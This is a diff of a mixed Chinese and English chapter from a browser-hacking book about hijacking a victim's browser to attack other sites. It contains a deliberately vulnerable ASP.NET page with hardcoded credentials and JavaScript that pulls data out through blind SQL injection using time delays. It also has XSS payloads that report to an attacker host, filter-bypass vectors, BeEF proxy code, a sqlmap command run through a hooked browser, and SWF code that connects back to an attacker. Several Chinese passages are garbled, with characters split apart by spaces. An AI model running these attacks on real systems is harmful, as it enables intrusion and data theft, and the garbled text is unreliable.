+请参考下面的故意存在漏洞的ASP.NET示例，它使用MSSQL 2008，并在`book_id`参数上存在可以跨来源（cross-origin）利用的SQL注入漏洞。下面是C#服务器端代码：
 
 ```csharp
 public partial class _Default : System.Web.UI.Page{
+
  // 获取 Web.config 中的 SQL Server 2008 连接详情
+
  protected SqlConnection dbConn = new SqlConnection(
+
   ConfigurationManager.ConnectionStrings["sqlserver"].ToString()
+
  );
 
  protected void Page_Load(object sender, EventArgs e){
+
   if(Request.QueryString["book_id"] != null){
+
      // SQL 查询易受 SQL 注入攻击
+
      string sql = "SELECT * FROM books WHERE id = " + 
+
        Request.QueryString["book_id"];
 
      SqlCommand cmd = new SqlCommand(sql, dbConn);
+
      dbConn.Open();
-     
+
      // 遍历查询结果 
+
      SqlDataReader results = cmd.ExecuteReader();
+
      string response = "";
+
      while(results.Read()){
+
       response += "<b>Book name:</b> " + results["name"] +
+
        "<br><b>Book authors:</b> " + results["author"];
+
      }
+
     Response.Write(response);    
+
     results.Close();
+
     dbConn.Close();
+
   }
+
  }
 }
 ```
 
-正如每个 ASP.NET 应用都会使用的 Web.config 文件，其中包含数据库连接信息：
+正如每个ASP.NET应用都会使用的`Web.config`文件，其中包含数据库连接信息：
 
 ```xml
 <add name="sqlserver"
@@ -11078,11 +11230,11 @@ database=sql_InjEction_1234;uid=sa;password=Abcd-1234;"
 </connectionStrings>
 ```
 
-根据 Microsoft Developer Network 的说明，以及本章前面简要介绍的内容，如果在同一 MSSQL 服务器上指定多个 WAITFOR 语句，它们会在独立的线程中执行。除非服务器因高负载出现线程不足的情况，否则来自不同 HTTP 请求的多个 WAITFOR 语句都会按预期执行。
+根据Microsoft Developer Network的说明，以及本章前面简要介绍的内容，如果在同一MSSQL服务器上指定多个`WAITFOR`语句，它们会在独立的线程中执行。除非服务器因高负载出现线程不足的情况，否则来自不同HTTP请求的多个`WAITFOR`语句都会按预期执行。
 
-并不是所有数据库都如此行为。看起来 MSSQL 是唯一能可靠支持并行时间延迟的数据库。Sqlmap 完全在处理基于时间的盲注入时禁用多线程，原因正是如此。然而，在 MSSQL 环境中并行化基于时间的盲注入数据提取是可行的，后面章节会进一步说明。
+并不是所有数据库都如此行为。看起来MSSQL是唯一能可靠支持并行时间延迟的数据库。`Sqlmap`完全在处理基于时间的盲注入时禁用多线程，原因正是如此。然而，在MSSQL环境中并行化基于时间的盲注入数据提取是可行的，后面章节会进一步说明。
 
-下面的代码用于从该脆弱的 ASP.NET 应用中获取当前使用的数据库名称。代码包含两个部分：WebWorker 执行的代码以及 WebWorker 控制器。每个 WebWorker 执行以下代码：
+下面的代码用于从该脆弱的ASP.NET应用中获取当前使用的数据库名称。代码包含两个部分：`WebWorker`执行的代码以及`WebWorker`控制器。每个`WebWorker`执行以下代码：
 
 ```javascript
 var uri, port, path, payload;
@@ -11094,7 +11246,6 @@ onmessage = function (e) {
  port = e.data['port'];
  path = e.data['path'];
  payload = e.data['payload'];
-
  index = e.data['index'];
  seconds = e.data['seconds'];
  position = e.data['position'];
@@ -11108,11 +11259,11 @@ function retrieveChar(index, seconds, position){
  var index;
  var isLastReqSleep = false;
  var reqNumber = 0;
+
  // 如果所有请求都不延迟，则说明我们在查询超出范围的位置。
  var stringEndReached = true;
 
  function doRequest(index, seconds, position){
-
   if(lowerbound <= upperbound){
    reqNumber++;
    index = Math.floor((lowerbound + upperbound) / 2);
@@ -11122,6 +11273,7 @@ function retrieveChar(index, seconds, position){
    // ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),
    var xhr = new XMLHttpRequest();
    var started = new Date().getTime();
+
    xhr.open("GET", uri + ":" + port + path + enc_payload, false);
    xhr.onreadystatechange=function(){
    if(xhr.readyState == 4){
@@ -11138,15 +11290,16 @@ function retrieveChar(index, seconds, position){
     }else{
       upperbound = index - 1;
     }
+
     /* 递归调用 doRequest() */
     doRequest(index, seconds, position);
  }}
  xhr.send();
-
  }else{
   if(isLastReqSleep){
    index++;
   }
+
   /* 向 WebWorker 控制器发送已获取字符的信息
    如果 stringEndReached==true 表示我们在查询越界位置，且已找到要提取的数据的末尾 */
   postMessage(
@@ -11161,9 +11314,9 @@ function retrieveChar(index, seconds, position){
 doRequest(index, seconds, position);
 ```
 
-该代码使用二元推断法获取指定位置字符的十进制表示值。正如你所知，ASCII 字符的取值范围是 1（SOH）到 127（DEL），涵盖小写和大写字母、数字以及符号。通过二元推断，你可以在七次请求（七次 HTTP 请求）内检索字符串（这里是数据库名）的每一个字符。
+该代码使用二元推断法获取指定位置字符的十进制表示值。正如你所知，ASCII字符的取值范围是1（SOH）到127（DEL），涵盖小写和大写字母、数字以及符号。通过二元推断，你可以在七次请求（七次HTTP请求）内检索字符串（这里是数据库名）的每一个字符。
 
-在加入 console.log() 后，下面是查询数据库名第一个字符（本例中为 s）时的输出示例：
+在加入`console.log()`后，下面是查询数据库名第一个字符（本例中为`s`）时的输出示例：
 
 ```
 Response delayed. Char is > 64
@@ -11175,7 +11328,7 @@ Response delayed. Char is > 114
 Response not delayed. Char is == 115 -> s
 ```
 
-第一个跨来源 HTTP 请求的 URL 如下，用于获取数据库名的第一个字符：
+第一个跨来源HTTP请求的URL如下，用于获取数据库名的第一个字符：
 
 ```
 http://172.16.37.149:8080/?book_id=1%20IF(UNICODE(SUBSTRING( 
@@ -11183,17 +11336,17 @@ http://172.16.37.149:8080/?book_id=1%20IF(UNICODE(SUBSTRING(
 CHAR(32))),1,1))%3E64)%20WAITFOR%20DELAY%20%270:0:2%27--
 ```
 
-从前面 console.log() 的输出可知，响应会被延迟，因为 115 > 64。过程会持续进行，直到 lowerbound <= upperbound，即不再需要迭代，因为 115 < 116 且 115 > 114，最终字符为 115。WebWorker 完成后会通过 postMessage() 向父控制器通信结果：
+从前面`console.log()`的输出可知，响应会被延迟，因为`115 > 64`。过程会持续进行，直到`lowerbound <= upperbound`，即不再需要迭代，因为`115 < 116`且`115 > 114`，最终字符为`115`。`WebWorker`完成后会通过`postMessage()`向父控制器通信结果：
 
 ```
 postMessage({'position':position,'char':index,'end':stringEndReached});
 ```
 
+
+
 每个 WebWorker 负责在指定位置检索单个字符。启动 worker 并验证结果的任务由以下控制器代码完成：
 
-
-
-
+```javascript
 if(!!window.Worker){
 
 // WebWorker code location
@@ -11299,35 +11452,35 @@ console.log("WebWorker not supported!");
 }
 ```
 
-The target is an internal network web application available at 172.16.37.149:8080. After identifying that the base HTTP response time for the / resource is always less than 0.2 seconds, you can be confident using a time delay of 2 seconds (timeDelay variable). The number of workers used in parallel defaults to 5, but can be altered using the workers_number variable. The code executed by each WebWorker needs to be loaded from the same-origin that loads the controller code, and can be configured through the wwloc variable.
+The target is an internal network web application available at `172.16.37.149:8080`. After identifying that the base HTTP response time for the `/` resource is always less than `0.2` seconds, you can be confident using a time delay of `2` seconds (`timeDelay` variable). The number of workers used in parallel defaults to `5`, but can be altered using the `workers_number` variable. The code executed by each WebWorker needs to be loaded from the same-origin that loads the controller code, and can be configured through the `wwloc` variable.
 
-When spawnWorkers() is called, initially with position 1 (because you need to retrieve the first character of the database name), it creates five WebWorkers. Each worker focuses on retrieving the character at a specified position. The first works on position 1, the second on position 2, and so on. At the same time, the checkComplete() function is called every second. This function is responsible for checking how many workers completed their jobs successfully, and if the end of the database name was reached.
+When `spawnWorkers()` is called, initially with `position` `1` (because you need to retrieve the first character of the database name), it creates five WebWorkers. Each worker focuses on retrieving the character at a specified position. The first works on position `1`, the second on position `2`, and so on. At the same time, the `checkComplete()` function is called every second. This function is responsible for checking how many workers completed their jobs successfully, and if the end of the database name was reached.
 
-One way to discover the length of the data to be retrieved is to issue seven requests for an out-of-bounds position, and check if they were all delayed. MSSQL doesn’t allow null characters in the database names, so this makes the process more straightforward. In this case the length of the database called sql_InjEction_1234 is 18, so if all the seven requests to retrieve the character at position 19 are not delayed, it means you have reached the end of the data.
+One way to discover the length of the data to be retrieved is to issue seven requests for an out-of-bounds position, and check if they were all delayed. MSSQL doesn’t allow null characters in the database names, so this makes the process more straightforward. In this case the length of the database called `sql_InjEction_1234` is `18`, so if all the seven requests to retrieve the character at position `19` are not delayed, it means you have reached the end of the data.
 
-More workers are spawned until dataLength is known. When dataLength has been discovered, and all workers completed, the interval used to call checkComplete() is cleared, and the database name value is reconstructed. The dbname array contains all the retrieved characters in their decimal representation. You just need to iterate through it and call String.fromCharCode(char) to have the string representation. This task is executed by the finish() function.
+More workers are spawned until `dataLength` is known. When `dataLength` has been discovered, and all workers completed, the interval used to call `checkComplete()` is cleared, and the database name value is reconstructed. The `dbname` array contains all the retrieved characters in their decimal representation. You just need to iterate through it and call `String.fromCharCode(char)` to have the string representation. This task is executed by the `finish()` function.
 
-The result of executing this technique with five workers in parallel, using time delays of 2 seconds, and having a base response time of 0.2 seconds, can be seen in Figure 9-13. In just 44 seconds, the database name is retrieved.
+The result of executing this technique with five workers in parallel, using time delays of `2` seconds, and having a base response time of `0.2` seconds, can be seen in Figure 9-13. In just `44` seconds, the database name is retrieved.
 
- start figure 
+start figure
 
 **Figure 9-13:** Five WebWorkers retrieving database name in Chrome
 
 ![c09f013.tif](img/c09f013.png)
 
- end figure 
+end figure
 
-Trying the same with 10 workers reduces the total retrieval time to 30 seconds, as you can see in Figure 9-14.
+Trying the same with `10` workers reduces the total retrieval time to `30` seconds, as you can see in Figure 9-14.
 
- start figure 
+start figure
 
 **Figure 9-14:** Ten WebWorkers retrieving database name in Firefox
 
 ![c09f014.tif](img/c09f014.png)
 
- end figure 
+end figure
 
-Starting Sqlmap with the same time-delay settings as the cross-origin demonstration earlier, it takes almost 140 seconds to retrieve the same results:
+Starting Sqlmap with the same time-delay settings as the cross-origin demonstration earlier, it takes almost `140` seconds to retrieve the same results:
 
 ```
 ./sqlmap.py -u "http://172.16.37.149:8080/?book_id=1"
@@ -11347,10 +11500,7 @@ In this section, you have explored techniques to exploit SQL injection vulnerabi
 
 ## Detecting Cross-site Scripting Vulnerabilities
 
-
-
-
--   跨域脚本注入（XSS）漏洞在第二章中进行了分析，提供了真实网页应用中该类漏洞的示例。本节重点从被钩针浏览器中完全检测 XSS 漏洞。  
+- 跨域脚本注入（XSS）漏洞在第二章中进行了分析，提供了真实网页应用中该类漏洞的示例。本节重点从被钩针浏览器中完全检测 XSS 漏洞。
 
 ### 跨域盲目 XSS 检测
 
@@ -11358,7 +11508,9 @@ In this section, you have explored techniques to exploit SQL injection vulnerabi
 
 在前面章节的方法指导下，发现了 `http://192.168.1.1/chapter?id=1` URL，接下来是检查 `id` 参数是否易受 XSS 影响。为此，需要在 IFrame 中加载该 URL，并在参数值后追加经典 XSS 字符串。结果如下：
 
-``` 
+
+
+```
 <iframe src="http://192.168.1.1/chapter?id=1 
   %3Cscript%3Ealert(1)%3C%2Fscript%3E">
 ```
@@ -11367,28 +11519,28 @@ In this section, you have explored techniques to exploit SQL injection vulnerabi
 
 这种通过在 IFrame 中加载资源进行 XSS 检测的思路在 2009 年由 Gareth Heyes 扩展，他当时创建了 XssRays。XssRays 是一种纯 JavaScript 的 XSS 扫描器。简而言之，XssRays 会获取页面的所有链接和表单，并在这些资源的路径以及参数上追加 XSS 载荷，然后在 IFrame 中加载。
 
-2009 年时，仍可利用 URI 片段标识符（#）实现子到父 IFrame 的通信，即使在跨域场景下；但现代浏览器已修补此漏洞。事实上，这类问题可以被视为同源策略（SOP）违规，因为根据 SOP，跨域资源加载到 IFrame 中不应能与顶层窗口通信。
+2009 年时，仍可利用 URI 片段标识符（`#`）实现子到父 IFrame 的通信，即使在跨域场景下；但现代浏览器已修补此漏洞。事实上，这类问题可以被视为同源策略（SOP）违规，因为根据 SOP，跨域资源加载到 IFrame 中不应能与顶层窗口通信。
 
 XssRays 完全使用 JavaScript 编写，使其非常适合直接在被钩针浏览器中使用。可以通过替换已修补的片段标识符绕过，在现代浏览器中复用旧版 XssRays 逻辑。新的负载需要采用更为严谨、符合 SOP 的方式：当成功发现 XSS 漏洞时，攻击者需要在不违背 SOP 的前提下通知自己。
 
-新负载会将 IFrame 的 src 更新为攻击者已知的资源，例如服务器上的处理器。以之前的例子为例，新的载荷如下：
+新负载会将 IFrame 的 `src` 更新为攻击者已知的资源，例如服务器上的处理器。以之前的例子为例，新的载荷如下：
 
-``` 
+```
 <iframe src="http://192.168.1.1/chapter?id=1%3Cscript%3Elocation%3D'http%3A  
 %2F%2Fbrowserhacker.com%2Fxssrays%3Fdetails%3D....'%3C%2Fscript%3E">
 ```
 
-如果攻击成功，会向 http://browserhacker.com/xssrays 发起 GET 请求，并附带关于 XSS 漏洞的详细信息。该方法能够消除假阳性，因为只有在实际执行了指示后，服务器上的处理器才会收到 GET 请求。
+如果攻击成功，会向 `http://browserhacker.com/xssrays` 发起 GET 请求，并附带关于 XSS 漏洞的详细信息。该方法能够消除假阳性，因为只有在实际执行了指示后，服务器上的处理器才会收到 GET 请求。
 
 XssRays 的改进版本已纳入 BeEF，并且可以注入到被钩针浏览器中，用于检查同源和跨域资源的 XSS 漏洞。下面的图（Figure 9-15）展示了 XssRays 在 BeEF 中的工作流程：
 
- start figure 
+start figure
 
-[**Figure 9-15:** XssRays 的高层架构
+**Figure 9-15:** XssRays 的高层架构
 
 ![c09f015.tif](img/c09f015.png)
 
- end figure 
+end figure
 
 虽然 XssRays 也可以用于同源场景来发现 XSS 漏洞，但其价值有限，因为你本身就可以在不受 SOP 限制的情况下访问整个同源。同源 XSS 漏洞并不一定在横向移动基础设施时提供更大优势。
 
@@ -11406,7 +11558,7 @@ XssRays 的改进版本已纳入 BeEF，并且可以注入到被钩针浏览器�
 
 下面进入获取新源的具体过程。基于前面 XssRays 的示例，使用 BeEF 在隐藏 IFrame 中钩住 `http://192.168.1.1/chapter?id=1` 这一脆弱资源的步骤如下（需要执行两行 JavaScript）：
 
-``` 
+```
 var i = beef.dom.createInvisibleIframe();
 i.setAttribute(
   'src', 
@@ -11420,11 +11572,9 @@ i.setAttribute(
 
 ### XSS 过滤器规避
 
-现代浏览器默认实现 XSS 过滤控制，这会降低跨域钩针的可靠性。绕过这些措施的技术将继续成为一场虚拟的军备竞赛，但很可能在你的被钩针浏览器中仍有一条可行的路径。 
+现代浏览器默认实现 XSS 过滤控制，这会降低跨域钩针的可靠性。绕过这些措施的技术将继续成为一场虚拟的军备竞赛，但很可能在你的被钩针浏览器中仍有一条可行的路径。
 
-
-
-Chrome 的过滤器，也在 Safari 中实现（因为它们都使用 WebKit 渲染引擎），被称为`XssAuditor`。此过滤器无法防止使用 data URI 向量进行的 XSS 攻击。Mario Heiderich 在 2010 年向 Chrome 开发团队报告了此问题。24 此时的此绕过尚未被修复。
+Chrome 的过滤器，也在 Safari 中实现（因为它们都使用 WebKit 渲染引擎），被称为 `XssAuditor`。此过滤器无法防止使用 data URI 向量进行的 XSS 攻击。Mario Heiderich 在 2010 年向 Chrome 开发团队报告了此问题。24 此时的此绕过尚未被修复。
 
 data URI 方案最初是用于在 HTML 页面中以外部资源的形式包含内联数据。其格式为：
 
@@ -11440,7 +11590,7 @@ AAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO \
 9TXL0Y4OHwAAAABJRU5ErkJggg==">
 ```
 
-这种方案并不阻止包含其他类型的内容，例如使用 charset 为 text/html 的类型并 base64 编码字符串如<script>alert(1)</script>。如果你编码该字符串，会得到以下 data URI：
+这种方案并不阻止包含其他类型的内容，例如使用 charset 为 text/html 的类型并 base64 编码字符串如 `<script>alert(1)</script>`。如果你编码该字符串，会得到以下 data URI：
 
 ```
 <iframe src="data:text/html;base64, \
@@ -11465,7 +11615,7 @@ if(beef.browser.isC() || beef.browser.isS()){
 
 一个宽松的跨源策略，使用通配符或 SOP 绕过，允许你使用被钩住的浏览器作为开放的 HTTP 代理。如果没有 SOP 绕过或配置错误，你仍然可以通过被钩住的浏览器代理请求，但 SOP 将你限制在当前被钩住的源域。这在以下情况下很有用：通过 XSS 钩住一个源域，但你没有直接访问它。SOP 绕过在第四章中涵盖。
 
-BeEF 的 Tunneling Proxy 扩展在 127.0.0.1:6789 绑定一个服务器套接字，能够解析原始 HTTP 请求。以下代码片段展示了其部分功能：
+BeEF 的 Tunneling Proxy 扩展在 `127.0.0.1:6789` 绑定一个服务器套接字，能够解析原始 HTTP 请求。以下代码片段展示了其部分功能：
 
 ```
 def initialize
@@ -11544,7 +11694,7 @@ def add_to_body(output)
 end
 ```
 
-变量 output，在代码片段中可见，是一个 Hash 的 JSON 表示，包含发送所需的所有请求详细信息。这些信息作为参数传递给 beef.net.requester.send 方法。该方法为 requests_array 数组的每个条目创建一个 XMLHttpRequest，并调用 beef.net.forge_request，如下所示：
+变量 `output`，在代码片段中可见，是一个 Hash 的 JSON 表示，包含发送所需的所有请求详细信息。这些信息作为参数传递给 `beef.net.requester.send` 方法。该方法为 `requests_array` 数组的每个条目创建一个 XMLHttpRequest，并调用 `beef.net.forge_request`，如下所示：
 
 ```
 beef.net.requester = {
@@ -11576,19 +11726,19 @@ beef.net.requester = {
 };
 ```
 
-forge_request 的最后一个参数是一个匿名函数，用作回调，在 forge_request 完成时被调用。这会触发 beef.net.send，以将 XHR 响应数据（如状态、头部和体）发送回 BeEF 服务器。服务器会剥除部分 HTTP 响应头，主要是与缓存和编码相关的字段，并调整 Content-Length 响应头。这种响应规范化是必要的，因为原始 HTTP 响应是通过 XMLHttpRequest 获取的，可能包含 GZIP 编码头部。如果 Tunneling Proxy 服务器保留这些头部，可能会导致 Content-Length 不匹配问题，因为被钩住的浏览器在获得 XHR 响应后已经解码了响应。
+`forge_request` 的最后一个参数是一个匿名函数，用作回调，在 `forge_request` 完成时被调用。这会触发 `beef.net.send`，以将 XHR 响应数据（如状态、头部和体）发送回 BeEF 服务器。服务器会剥除部分 HTTP 响应头，主要是与缓存和编码相关的字段，并调整 `Content-Length` 响应头。这种响应规范化是必要的，因为原始 HTTP 响应是通过 XMLHttpRequest 获取的，可能包含 GZIP 编码头部。如果 Tunneling Proxy 服务器保留这些头部，可能会导致 Content-Length 不匹配问题，因为被钩住的浏览器在获得 XHR 响应后已经解码了响应。
 
-在此阶段，规范化后的原始 HTTP 响应可以发送回最初向 BeEF 的 Tunneling Proxy 端口 6789 发送请求的套接字。根据 BeEF 中配置的轮询超时、目标应用的响应时间以及被钩住浏览器的带宽，你可能会在收到响应时注意到几秒的延迟。
+在此阶段，规范化后的原始 HTTP 响应可以发送回最初向 BeEF 的 Tunneling Proxy 端口 `6789` 发送请求的套接字。根据 BeEF 中配置的轮询超时、目标应用的响应时间以及被钩住浏览器的带宽，你可能会在收到响应时注意到几秒的延迟。
 
 图 Figure 9-16 展示了 Tunneling Proxy 内部的高层次视图。
 
- start figure 
+start figure
 
 **Figure 9-16:** BeEF 的 Tunneling Proxy 内部
 
 ![c09f016.tif](img/c09f016.png)
 
- end figure 
+end figure
 
 为了减少这些延迟，BeEF 的 WebSocket 通信通道可以帮助。默认情况下该通道是禁用的，需要先启用。WebSocket 是一个流式协议，比默认的 XHR-polling 通道快得多。WebSocket 通道仅在被钩住的浏览器完全支持时启用，因此无需担心失去对较旧浏览器的钩连可能。
 
@@ -11598,10 +11748,7 @@ forge_request 的最后一个参数是一个匿名函数，用作回调，在 fo
 
 与其使用标准 HTTP 代理，你可以插入被钩住的浏览器。现在中介是被钩住的浏览器，而不仅仅是代理，它不仅代理你的请求，还为所有请求提供代理的权限。结果是，被钩住的浏览器允许你浏览被钩住的源域，这可能之前超出了你的可达范围。
 
-
-
-
--   [重要] 每个请求都携带了被钩钉（hook）浏览器的所有权限。如前面本章所强调的，如果目标已认证到某个应用，那么你的攻击浏览器也是已认证的。在 `Figure 9-17`<a href="#c09.html#figure9-17"></a> 中，你会看到 Opera 浏览器已被配置为使用 `127.0.0.1:6789` — BeEF 的隧道代理 URI — 作为默认 HTTP 代理。
+- [重要] 每个请求都携带了被钩钉（hook）浏览器的所有权限。如前面本章所强调的，如果目标已认证到某个应用，那么你的攻击浏览器也是已认证的。在 `Figure 9-17` 中，你会看到 Opera 浏览器已被配置为使用 `127.0.0.1:6789` — BeEF 的隧道代理 URI — 作为默认 HTTP 代理。
 
 start figure
 
@@ -11610,6 +11757,8 @@ start figure
 ![c09f017.tif](img/c09f017.png)
 
 end figure
+
+
 
 从 Opera 浏览器发出的攻击请求指向 `/dvwa/vulnerabilities/upload` 资源，属于被钩钉域。请求到达代理，如 `Figure 9-18`<a href="#c09.html#figure9-18"></a> 所示的日志所示，随后被转换为 XMLHttpRequest 并注入被钩钉浏览器。
 
@@ -11718,9 +11867,6 @@ end figure
 
 ### 通过浏览器进行 Burp
 
-
-
-
 Why 不要 只 简单 浏览 目标 浏览器中的钩 目域 就 停 止 时，你 可以 同时 寻找 诸如 SQL 注入 或 Remote Command Execution 等 附加 漏洞。BeEF 的 代理 不 仅 接受 浏览器 的 连接，还 可以 接受 任何 Web 客户端 软件 的 Web 流量。
 
 一种 流行 的 方法 是 使用 Dafydd Stuttard 的 Burp Suite 来 查找 这类 漏洞。渗透测试人员 经常 使用 Burp 来 查找 安全漏洞。Burp 不 仅 可以 用 于 Web 应用，还 可以 用 于 任何 使用 HTTP 作为 主 协议 的 应用 或 系统。
@@ -11745,7 +11891,7 @@ start figure
 
 end figure 
 
-Spider 将 希望 发现 许多 新的 资源， 供 你 检查 安全漏洞。 例如， 如果 Spider 发现 了 /dvwa/vulnerabilities/sqli/ 资源， 你 会 看到 它 期望 一个 id 参数。 使用 Burp 的 Repeater 组件 更 改 默认 参数 输入 为 不 同 的 整数， 你 会 观察 到 不 同 的 输出， 因此 合理 地 认为 这里 有一个 某 种 数据存储 的 查询 正 在 发生。
+Spider 将 希望 发现 许多 新的 资源， 供 你 检查 安全漏洞。 例如， 如果 Spider 发现 了 `/dvwa/vulnerabilities/sqli/` 资源， 你 会 看到 它 期望 一个 id 参数。 使用 Burp 的 Repeater 组件 更 改 默认 参数 输入 为 不 同 的 整数， 你 会 观察 到 不 同 的 输出， 因此 合理 地 认为 这里 有一个 某 种 数据存储 的 查询 正 在 发生。
 
 在 这 个 阶段， 你 可能 想 要 检查 该 资源 是否 受 SQL、LDAP 或 XML 注入 影响。 如果 你 使用 的是 Burp Suite Professional， 你 可以 使用 Scanner 组件， 如 图 9-25 和 图 9-26 所示。
 
@@ -11767,7 +11913,7 @@ start figure
 
 end figure 
 
-如 图 9-26 所示， 该 资源 /dvwa/vulnerabilities/sqli/?id=xyz 看 起来 对 SQL 注入 是 脆 弱 的， 并且 数据库 看 起来 是 MySQL。
+如 图 9-26 所示， 该 资源 `/dvwa/vulnerabilities/sqli/?id=xyz` 看 起来 对 SQL 注入 是 脆 弱 的， 并且 数据库 看 起来 是 MySQL。
 
 通过 目标 浏览器 发起 攻击 不 仅 将 恶意 请求 在 目标 源 站 点 的 上下文 中 传输， 还 会 增 加 隐 瞒 性。 目标 服务器 的 日志 将 包含 目标 浏览器 的 IP 地址， 而 不是 攻击 者 的 IP。
 
@@ -11775,7 +11921,7 @@ Sqlmap 通过 浏览器
 
 Sqlmap 是 一 个 更 受 歡 迎 的 开源 工具， 用 于 利 用 SQL 注入， 可以 通过 Tunneling Proxy 使 用。 如果 你 没 有 SOP 绕 过， 你 只 能 目 标 钩 目 域。 如前 面 所 述， 目标 将 收 到 从 目标 浏览器 发出 的 恶意 SQLi 负载， 而 不是 直接 来 自 攻击 者 IP。 这种 隐 瞒 性 可能 取 决 于 其 他 层 次 控 制 的 存在， 这 些 控制 可能 保 护 了 Web 应用。
 
-假 设 你 正 在 使用 Tunneling Proxy 和 Burp， 类 似 早 先 的 场景， 并且 你 发现 了 一个 资源， 该 资源 被 Burp 标记 为 对 SQL 注入 脆 弱。 在这 种 情况 下， /dvwa/vulnerabilities/sqli/?id=abc 看 起来 可以 利 用。 要 使 用 Sqlmap 利 用 这个 漏洞， 使 用 如 下 命令 和 参数：
+假 设 你 正 在 使用 Tunneling Proxy 和 Burp， 类 似 早 先 的 场景， 并且 你 发现 了 一个 资源， 该 资源 被 Burp 标记 为 对 SQL 注入 脆 弱。 在这 种 情况 下， `/dvwa/vulnerabilities/sqli/?id=abc` 看 起来 可以 利 用。 要 使 用 Sqlmap 利 用 这个 漏洞， 使 用 如 下 命令 和 参数：
 
 ```
 ./sqlmap.py --proxy http://127.0.0.1:6789 -u \
@@ -11783,7 +11929,7 @@ Sqlmap 是 一 个 更 受 歡 迎 的 开源 工具， 用 于 利 用 SQL 注�
 /?id=abc&Submit=Submit" -p id -v 3 --current-db
 ```
 
-注 意 使 用 了 --proxy 选 项， 指 定 了 BeEF 代理 的 URI。 通过 Firebug 检 查 目 标 浏览器 的 原 始 请 求， 你 可以 看 到 恶意 的 URL 编码 SQLi 攻击 向量 在 图 9-27 中。
+注 意 使 用 了 `--proxy` 选 项， 指 定 了 BeEF 代理 的 URI。 通过 Firebug 检 查 目 标 浏览器 的 原 始 请 求， 你 可以 看 到 恶意 的 URL 编码 SQLi 攻击 向量 在 图 9-27 中。
 
 start figure
 
@@ -11805,20 +11951,18 @@ end figure
 
 在 图 9-29 中， 你 可以 看 到 目 标 浏览器 的 原 始 请 求 和 响 应 的 详 细 信 息。
 
+MalaRIA 由两个组件组成：Flash 或 Silverlight 客户端小部件以及代理后端。这两个客户端小部件的工作方式相同，但这里只讨论 Flash 小部件。下面的代码是 `malariaproxy.mxml` 的 SWF Flex 源码片段。浏览器加载 SWF 文件后，它会立即连接到代理后端，等待指令：
 
 
 
-MalaRIA 由两个组件组成：Flash 或 Silverlight 客户端小部件以及代理后端。这两个客户端小部件的工作方式相同，但这里只讨论 Flash 小部件。下面的代码是 malariaproxy.mxml 的 SWF Flex 源码片段。浏览器加载 SWF 文件后，它会立即连接到代理后端，等待指令：
-
-<x0.2367><y0.2469>```java
+```java
 <mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" 
 layout="absolute" xmlns="*" 
 creationComplete="useHttpService()">
 <mx:Script>
 <![CDATA[
-[...]
 
-/* Connect back to the proxy backend*/
+ /* Connect back to the proxy backend*/
 public function useHttpService():void {
     socket = new Socket();
     ExternalInterface.call("log", "Connecting back to malaRIA");
@@ -11875,23 +12019,23 @@ event.target.bytesTotal + " (" + event.target.data.length + ")");
 
 You can start the proxy back end with the following command:
 
-<x0.2367><y0.2469>```java
+```java
 sudo java malaria.MalariaServer browserhacker.com 8081
 ```
 
 This command binds the malaRIA back end on port 8080. You want to point your browser to this port to allow all the traffic to be relayed through the SWF widget injected in the target’s hooked browser. Port 8081 is used by the malaRIA back end to handle reverse connections coming from the widget. You need root privileges to start the server because the application binds two additional sockets on ports 843 and 943. This is demonstrated in Figure 9-31.
 
- start figure 
+start figure
 
 **Figure 9-31:** malaRIA proxy ready to receive connections from the SWF widget
 
 ![c09f031.tif](img/c09f031.png)
 
- end figure 
+end figure
 
-These two ports are required because when the SWF or Silverlight widget connects back to the malaRIA server, it first needs to retrieve the cross-origin policy for browserhacker.com. If the widget is SWF, it tries to retrieve the policy from port 843. However, if it’s Silverlight it points to port 943. This is why the FlexPolicyServer.java class, part of the proxy back-end code, has the following method that returns the right cross-origin policy:
+These two ports are required because when the SWF or Silverlight widget connects back to the malaRIA server, it first needs to retrieve the cross-origin policy for `browserhacker.com`. If the widget is SWF, it tries to retrieve the policy from port 843. However, if it’s Silverlight it points to port 943. This is why the `FlexPolicyServer.java` class, part of the proxy back-end code, has the following method that returns the right cross-origin policy:
 
-<x0.2367><y0.2469>```java
+```java
 public static void printFlexPolicy(PrintStream clientOut, \
 String hostname, int port) {
  clientOut.print("<?xml version=\"1.0\"?>\n");
@@ -11908,13 +12052,13 @@ policies=\"master-only\"/>");
 
 To generate the Flash SWF file from the Flex source, you need to use Adobe’s Flex SDK. You can compile the source code with the following command:
 
-<x0.2367><y0.2469>```java
+```java
 mxmlc --strict=true --file-specs malariaproxy.mxml
 ```
 
 The next step is to embed the SWF file previously generated in an HTML file like the following:
 
-<x0.2367><y0.2469>```java
+```java
 <head>
 <script>
 function log(msg) {
@@ -11932,31 +12076,31 @@ function log(msg) {
 </object>
 ```
 
-To better understand what’s happening under the hood, the code contains an additional logging facility, the log() function. Integrating this with BeEF, you may want to inject the SWF in an already hooked page, removing the logging facility that uses ExternalInterface.call to send messages from the SWF to the DOM.
+To better understand what’s happening under the hood, the code contains an additional logging facility, the `log()` function. Integrating this with BeEF, you may want to inject the SWF in an already hooked page, removing the logging facility that uses `ExternalInterface.call` to send messages from the SWF to the DOM.
 
-In the following example, the target is logged in to browservictim.com/dvwa/instructions.php. The domain exposes the /crossdomain.xml resource, which is an open cross-origin policy that allows connections from any domain.
+In the following example, the target is logged in to `browservictim.com/dvwa/instructions.php`. The domain exposes the `/crossdomain.xml` resource, which is an open cross-origin policy that allows connections from any domain.
 
-You trick the target into opening http://browserhacker.com/malariaproxy.html, which embeds the malicious malaRIA SWF file. At the same time, you open another browser (Opera) that is configured to use the malaRIA HTTP proxy back end. Now you can simply request an authenticated page such as http://browservictim.com/dvwa/vulnerabilities/upload.
+You trick the target into opening `http://browserhacker.com/malariaproxy.html`, which embeds the malicious malaRIA SWF file. At the same time, you open another browser (Opera) that is configured to use the malaRIA HTTP proxy back end. Now you can simply request an authenticated page such as `http://browservictim.com/dvwa/vulnerabilities/upload`.
 
 As a result, the proxy back end sends the request details to the SWF, as shown in Figure 9-32. The SWF returns the related response to the proxy back end, which then returns the response to your browser. This behavior is similar to BeEF’s Tunneling Proxy. The main difference is that instead of using JavaScript to send the requests, an SWF file is used.
 
- start figure 
+start figure
 
 **Figure 9-32:** malaRIA logs from both the proxy back end and the SWF file.
 
 ![c09f032.eps](img/c09f032.png)
 
- end figure 
+end figure
 
